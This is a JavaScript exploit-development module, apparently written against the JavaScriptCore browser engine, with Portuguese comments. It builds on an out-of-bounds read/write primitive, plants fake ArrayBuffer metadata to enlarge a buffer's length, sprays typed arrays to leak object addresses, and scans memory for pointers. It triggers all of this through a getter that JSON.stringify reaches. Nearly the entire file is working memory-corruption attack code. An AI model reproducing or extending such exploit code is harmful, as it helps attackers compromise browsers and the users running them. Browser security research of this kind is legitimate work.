// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForMassiveAttack";
let getter_called_flag = false;
let current_test_results = { /* Será inicializado corretamente */ };

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Para Teste 1: Metadados sombra para tamanho gigante
const FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE = 0x0; 
const FAKE_AB_HUGE_SIZE = new AdvancedInt64(0x7FFFFFF0, 0x0); 
const FAKE_AB_DATA_POINTER_FOR_RETYPE = new AdvancedInt64(0x0, 0x0);

class CheckpointForMassiveAttack {
    constructor(id) {
        this.id_marker = `MassiveAttackCheckpoint-${id}`;
        this.test_prop = "initial_checkpoint_prop_value";
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "MassiveAttack_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Iniciando bateria de testes...`, "vuln", FNAME_GETTER);
        
        // CORRIGIDO: Inicialização completa de current_test_results e suas sub-propriedades
        current_test_results = {
            overall_success: false, message: "Getter chamado, testes em andamento.",
            t1_retype_oob_ab: { success: false, details: "" },
            t2_addrof_spray: { success: false, leaks: [], details: "" },
            t3_snoop_oob_ab: { success: false, leaks: [], details: "" }, // Corrigido: Inicializado como objeto
            t4_fresh_ab: { success: false, details: "" },             // Corrigido: Teste 4 também usa um sub-objeto
            t5_this_integrity: { details: `this.id_marker: ${this.id_marker}, this.test_prop: ${this.test_prop || 'N/A'}` },
            error_in_getter: null
        };
        let sub_test_success_flag = false; // Flag para rastrear se algum sub-teste individual teve sucesso

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute || !JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer || !JSC_OFFSETS.JSCell) {
                throw new Error("Dependências críticas (OOB R/W, oob_ab, Offsets) não disponíveis no getter.");
            }
            // const arrayBufferStructureID = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID; // Descomente se usar

            // --- Teste 1: Re-Tipagem de Length do oob_array_buffer_real ---
            logS3("DENTRO DO GETTER (Teste 1): Tentando Re-Tipagem de Length do oob_array_buffer_real...", "subtest", FNAME_GETTER);
            let t1_temp_details = "";
            try {
                oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, FAKE_AB_HUGE_SIZE, 8);
                oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, FAKE_AB_DATA_POINTER_FOR_RETYPE, 8);
                t1_temp_details = `Metadados sombra (size=${FAKE_AB_HUGE_SIZE.toString(true)}) plantados em oob_data[${toHex(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE)}]. `;
                
                const reader_t1 = new Uint32Array(oob_array_buffer_real);
                t1_temp_details += `Uint32Array criado. Length reportado: ${reader_t1.length}. oob_ab.byteLength: ${oob_array_buffer_real.byteLength}.`;
                
                if (reader_t1.length * 4 === FAKE_AB_HUGE_SIZE.low() && FAKE_AB_HUGE_SIZE.low() > oob_array_buffer_real.byteLength) {
                    current_test_results.t1_retype_oob_ab.success = true; sub_test_success_flag = true;
                    t1_temp_details += " SUCESSO NA RE-TIPAGEM DE LENGTH!";
                    logS3(t1_temp_details, "vuln", FNAME_GETTER); // Log com detalhes até o ponto de sucesso/falha
                    // ... (lógica de leitura OOB se sucesso)
                } else {
                     t1_temp_details += ` Falha (Esperado ${FAKE_AB_HUGE_SIZE.low()/4}).`;
                     logS3(t1_temp_details, "info", FNAME_GETTER);
                }
            } catch (e1) { 
                t1_temp_details += ` Erro: ${e1.message}.`; 
                logS3(`Erro no Teste 1 (Re-Tipagem Length): ${e1.message}`, "error", FNAME_GETTER);
            }
            current_test_results.t1_retype_oob_ab.details = t1_temp_details;

            // --- Teste 2: AddrOf Especulativo com Spray ---
            logS3("DENTRO DO GETTER (Teste 2): Tentando addrof especulativo com spray...", "subtest", FNAME_GETTER);
            let t2_temp_leaks = [];
            let t2_temp_details = "";
            try {
                // ... (lógica do Teste 2 como antes) ...
                const target_obj_addrof_t2 = { "addrof_target": Date.now() };
                const spray_count_t2 = 100; 
                let float_readers_t2 = []; let obj_holders_t2 = [];
                const pattern_t2 = Math.sqrt(2);

                for(let i=0; i<spray_count_t2; i++) {
                    let fa = new Float64Array(4); 
                    for(let k=0; k<fa.length; k++) fa[k] = pattern_t2 + i;
                    float_readers_t2.push(fa);
                    obj_holders_t2.push( (i === Math.floor(spray_count_t2 / 2)) ? [target_obj_addrof_t2] : [{dummy_obj_t2:i}] );
                }
                t2_temp_details = `Spray de ${spray_count_t2} arrays concluído. `;
                let leak_found_in_spray_t2 = false;
                for(let i=0; i<float_readers_t2.length; i++) {
                    for(let j=0; j<float_readers_t2[i].length; j++) {
                        if (float_readers_t2[i][j] !== (pattern_t2 + i)) {
                            const f_val_t2 = float_readers_t2[i][j];
                            const dv_t2_leak = new DataView(new ArrayBuffer(8)); dv_t2_leak.setFloat64(0, f_val_t2, true);
                            const p_adv64_t2 = new AdvancedInt64(dv_t2_leak.getUint32(0,true), dv_t2_leak.getUint32(4,true));
                            t2_temp_leaks.push({source: `FloatArray[${i}][${j}]`, float_value: f_val_t2, hex_value: p_adv64_t2.toString(true)});
                            leak_found_in_spray_t2 = true;
                        }
                    }
                }
                if (leak_found_in_spray_t2) {
                    current_test_results.t2_addrof_spray.success = true; sub_test_success_flag = true;
                    logS3(`POTENCIAIS LEAKS ADDR_OF NO SPRAY (T2): ${t2_temp_leaks.length} encontrados.`, "vuln", FNAME_GETTER);
                }
            } catch (e2) { t2_temp_details += `Erro: ${e2.message}.`; logS3(`Erro no Teste 2 (AddrOf Spray): ${e2.message}`, "error", FNAME_GETTER); }
            current_test_results.t2_addrof_spray.details = t2_temp_details;
            current_test_results.t2_addrof_spray.leaks = t2_temp_leaks;

            // --- Teste 3: Sondagem Ampla do oob_array_buffer_real ---
            logS3("DENTRO DO GETTER (Teste 3): Sondando oob_array_buffer_real (primeiros 512 bytes)...", "subtest", FNAME_GETTER);
            let t3_temp_leaks = [];
            let t3_temp_details = "";
            try {
                // ... (lógica do Teste 3 como antes) ...
                const snoop_end_t3 = Math.min(0x200, oob_array_buffer_real.byteLength);
                let ptr_found_in_snoop_t3 = false;
                for (let offset = 0; offset < snoop_end_t3; offset += 8) {
                    if (offset === CORRUPTION_OFFSET_TRIGGER && oob_array_buffer_real.byteLength > offset + 7) continue; 
                    const val64_t3 = oob_read_absolute(offset, 8);
                    if (!val64_t3.equals(AdvancedInt64.Zero) && !val64_t3.equals(CORRUPTION_VALUE_TRIGGER)) {
                        const val_str_t3 = val64_t3.toString(true);
                        t3_temp_leaks.push({offset: toHex(offset), value: val_str_t3});
                        if (val64_t3.high() > 0x1000 && val64_t3.high() < 0x80000000 ) {
                             logS3(`PONTEIRO SUSPEITO (T3) em oob_data[${toHex(offset)}] = ${val_str_t3}`, "leak", FNAME_GETTER);
                             ptr_found_in_snoop_t3 = true;
                        }
                    } else if (offset === CORRUPTION_OFFSET_TRIGGER) {
                        t3_temp_leaks.push({offset: toHex(offset), value: `${val64_t3.toString(true)} (CorruptionValueTrigger)`});
                    }
                }
                t3_temp_details = `Sondagem de ${toHex(snoop_end_t3)} bytes concluída. `;
                if (ptr_found_in_snoop_t3) {
                    current_test_results.t3_snoop_oob_ab.success = true; sub_test_success_flag = true;
                }
            } catch (e3) { t3_temp_details += `Erro: ${e3.message}.`; logS3(`Erro no Teste 3 (Sondagem): ${e3.message}`, "error", FNAME_GETTER); }
            current_test_results.t3_snoop_oob_ab.details = t3_temp_details;
            current_test_results.t3_snoop_oob_ab.leaks = t3_temp_leaks;

            // --- Teste 4: ArrayBuffer "Fresco" ---
            logS3("DENTRO DO GETTER (Teste 4): Verificando ArrayBuffer 'fresco'...", "subtest", FNAME_GETTER);
            let t4_temp_details = "";
            try {
                // ... (lógica do Teste 4 como antes) ...
                let fresh_ab_t4 = new ArrayBuffer(128);
                let dv_fresh_t4 = new DataView(fresh_ab_t4);
                dv_fresh_t4.setUint32(0, 0x42424242, true);
                if (fresh_ab_t4.byteLength === 128 && dv_fresh_t4.getUint32(0,true) === 0x42424242) {
                    t4_temp_details = "AB fresco funciona normalmente.";
                } else {
                    t4_temp_details = `AB fresco ANÔMALO! Length: ${fresh_ab_t4.byteLength}, Conteúdo[0]: ${toHex(dv_fresh_t4.getUint32(0,true))}`;
                    current_test_results.t4_fresh_ab.success = true; // Sucesso se for anômalo
                    sub_test_success_flag = true; 
                }
                logS3(`(T4) ${t4_temp_details}`, current_test_results.t4_fresh_ab.success ? "vuln" : "info", FNAME_GETTER);
            } catch (e4) { t4_temp_details = `Erro no Teste 4 (AB Fresco): ${e4.message}`; logS3(t4_temp_details, "error", FNAME_GETTER); }
            current_test_results.t4_fresh_ab.details = t4_temp_details;
            
            // --- Teste 5: Integridade do 'this' (checkpoint_obj) ---
            // Já está na inicialização de current_test_results, apenas logamos
            logS3(`DENTRO DO GETTER (Teste 5): Verificando 'this'... ${current_test_results.t5_this_integrity.details}`, "subtest", FNAME_GETTER);


            if (sub_test_success_flag) {
                current_test_results.overall_success = true;
                current_test_results.message = "Bateria de testes CONCLUÍDA COM POTENCIAL SUCESSO em um ou mais sub-testes!";
            } else {
                 current_test_results.message = "Bateria de testes no getter concluída, sem sucesso óbvio em re-tipagem ou vazamento.";
            }

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error_in_getter = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        return 0xBADF00D;
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForMassiveAttack.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_massive_attack_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST_RUNNER = "executeMassiveAttackInGetterRunner";
    logS3(`--- Iniciando Bateria de Testes Agressivos no Getter ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { // Reset inicial completo
        overall_success: false, message: "Teste não executado.",
        t1_retype_oob_ab: { success: false, details: "" },
        t2_addrof_spray: { success: false, leaks: [], details: "" },
        t3_snoop_oob_ab: { success: false, leaks: [], details: "" },
        t4_fresh_ab: { success: false, details: "" },
        t5_this_integrity: { details: "" }, // Será preenchido no getter
        api_interaction_errors: [], error: null, error_in_getter: null
    };

    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID || !JSC_OFFSETS.JSCell) {
        logS3("Offsets JSC críticos ausentes.", "critical", FNAME_TEST_RUNNER);
        current_test_results.message = "Offsets JSC críticos ausentes.";
        return;
    }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            logS3("OOB Init falhou.", "critical", FNAME_TEST_RUNNER);
            current_test_results.message = "OOB Init falhou.";
            return;
        }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Plantando metadados sombra para Teste 1 (size=${FAKE_AB_HUGE_SIZE.toString(true)}) em oob_data[${toHex(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE)}]...`, "info", FNAME_TEST_RUNNER);
        oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, FAKE_AB_HUGE_SIZE, 8);
        oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, FAKE_AB_DATA_POINTER_FOR_RETYPE, 8);
        
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForMassiveAttack(1);
        logS3(`CheckpointForMassiveAttack objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) { 
            logS3(`Erro em JSON.stringify: ${e.message}`, "error", FNAME_TEST_RUNNER);
            if(!getter_called_flag) {
                current_test_results.error = String(e);
                current_test_results.message = `Erro em JSON.stringify (antes do getter): ${e.message}`;
            }
        }

    } catch (mainError) {
        logS3(`Erro principal no runner: ${mainError.message}`, "critical", FNAME_TEST_RUNNER);
        console.error(mainError); // Logar o erro completo no console do navegador
        current_test_results.message = `Erro crítico no runner: ${mainError.message}`;
        current_test_results.error = String(mainError);
    } finally {
        logS3("Limpeza finalizada.", "info", "CleanupRunner");
    }

    // Log dos resultados consolidados
    if (getter_called_flag) {
        logS3(`RESULTADO GERAL DA BATERIA DE TESTES: Success = ${current_test_results.overall_success}, Msg = ${current_test_results.message}`, current_test_results.overall_success ? "vuln" : "warn", FNAME_TEST_RUNNER);
        logS3(`  T1 (ReType OOB_AB): Success=${current_test_results.t1_retype_oob_ab.success}. ${current_test_results.t1_retype_oob_ab.details}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`  T2 (AddrOf Spray): Success=${current_test_results.t2_addrof_spray.success}. Leaks: ${current_test_results.t2_addrof_spray.leaks.filter(l => typeof l === 'object').length}`, "info", FNAME_TEST_RUNNER);
        current_test_results.t2_addrof_spray.leaks.forEach(l => {
            if (typeof l === 'object' && l.hex_value) { // Verifica se é o objeto de leak esperado
                logS3(`    Leak: ${l.hex_value} (float: ${l.float_value})`, "leak", FNAME_TEST_RUNNER);
            } else { 
                logS3(`    ${l}`, "info", FNAME_TEST_RUNNER); // Loga strings como "Spray concluído"
            }
        });

        logS3(`  T3 (Snoop OOB_AB): Success=${current_test_results.t3_snoop_oob_ab.success}. Leaks: ${current_test_results.t3_snoop_oob_ab.leaks.filter(l => typeof l === 'object').length}`, "info", FNAME_TEST_RUNNER);
        current_test_results.t3_snoop_oob_ab.leaks.forEach(l => {
             if (typeof l === 'object' && l.value) { // Verifica se é o objeto de leak esperado
                logS3(`    Offset ${l.offset}: ${l.value}`, "leak", FNAME_TEST_RUNNER);
            } else {
                logS3(`    ${l}`, "info", FNAME_TEST_RUNNER);
            }
        });
        logS3(`  T4 (AB Fresco): Success=${current_test_results.t4_fresh_ab.success}. ${current_test_results.t4_fresh_ab.details}`, "info", FNAME_TEST_RUNNER);
        logS3(`  T5 (This Integrity): ${current_test_results.t5_this_integrity.details}`, "info", FNAME_TEST_RUNNER);
        
        if (current_test_results.error_in_getter) {
            logS3(`  Erro no Getter: ${current_test_results.error_in_getter}`, "error", FNAME_TEST_RUNNER);
        }

    } else {
        logS3("RESULTADO BATERIA DE TESTES: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
        if (current_test_results.error) { // Se houve erro no runner antes do getter
            logS3(`  Erro (no runner): ${current_test_results.error} | Mensagem: ${current_test_results.message}`, "error", FNAME_TEST_RUNNER);
        }
    }

    clearOOBEnvironment();
    logS3(`--- Bateria de Testes Agressivos no Getter Concluída ---`, "test", FNAME_TEST_RUNNER);
}
